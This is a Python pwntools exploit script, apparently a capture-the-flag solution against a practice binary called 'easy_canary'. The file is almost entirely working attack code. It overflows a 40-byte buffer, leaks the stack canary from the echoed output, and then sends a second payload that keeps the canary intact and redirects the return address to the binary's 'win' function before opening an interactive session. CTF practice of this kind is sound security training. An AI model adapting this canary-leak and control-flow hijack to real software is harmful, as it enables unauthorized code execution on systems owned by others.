#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template easy_canary
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'easy_canary')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

elf = context.binary = ELF("./easy_canary", checksec=False)

io = start()

#piu piu piu

io.sendlineafter(b'> ', b'1')
payload = flat({40: b'x'})
io.send(payload)

io.sendlineafter(b'> ', b'2')
io.recvuntil(payload)
canary = u64(b'\0' + io.recv(7))
log.info(f'{canary = :#0x}')

#win

win = elf.symbols["win"]
print(hex(win))

#2nd payload

payload2 = b"a" * 40 + p64(canary) + b"b" * 8 + p64(win+4)
print(payload2)

#2nd attack

io.sendline(b"1")
io.recv()
io.sendline(payload2)
io.recv()
io.sendline(b"3")

io.interactive()
